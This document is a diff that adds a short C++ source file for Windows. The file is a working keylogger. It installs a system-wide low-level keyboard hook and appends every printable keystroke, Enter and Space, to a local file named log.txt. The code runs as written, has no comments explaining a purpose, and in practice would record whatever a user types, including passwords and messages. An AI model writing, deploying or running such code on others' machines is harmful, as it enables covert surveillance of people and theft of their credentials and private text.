@@ -1,0 +1,48 @@
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <conio.h>
+
+using namespace std;
+
+ofstream logFile("log.txt", ios::app);
+
+bool isPrintableChar(int key) {
+    return (key >= 32 && key <= 126); // Only printable ASCII characters
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
+        int key = kbdStruct->vkCode;
+
+        // Ignore modifier keys & combined key presses
+        if (GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_CONTROL) || GetAsyncKeyState(VK_MENU)) {
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
+        }
+
+        if (isPrintableChar(key)) {
+            logFile << (char)key;
+            logFile.flush();
+        } else if (key == VK_RETURN) {
+            logFile << "\n";
+            logFile.flush();
+        } else if (key == VK_SPACE) {
+            logFile << " ";
+            logFile.flush();
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int main() {
+    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(keyboardHook);
+    return 0;
+  }
